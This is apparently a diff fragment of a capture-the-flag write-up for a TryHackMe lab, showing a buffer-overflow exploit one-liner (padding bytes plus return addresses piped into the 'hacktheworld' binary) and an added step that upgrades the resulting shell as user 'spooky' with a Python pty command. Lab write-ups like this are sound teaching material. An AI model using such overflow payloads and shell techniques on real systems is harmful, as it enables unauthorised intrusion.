@@ -266,3 +266,12 @@ b'A' * 72                          # 72 junk bytes
 (python3 -c "import sys; sys.stdout.buffer.write(b'A'*72 + (0x40070f).to_bytes(8,'little') + (0x400657).to_bytes(8,'little'))"; cat) | ./hacktheworld
 ```
 
+![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/Anonymous%20Playground/Images/Screenshot%20From%202026-10-01%2011-05-04.png)
+
+> Now that we successfully exploited the vulnerability, and comprimised the user `spooky`, we may go ahead and spawn a clean shell for us using python.
+
+```zsh
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+spooky@ip-10-130-166-140:~$ 
+```
+
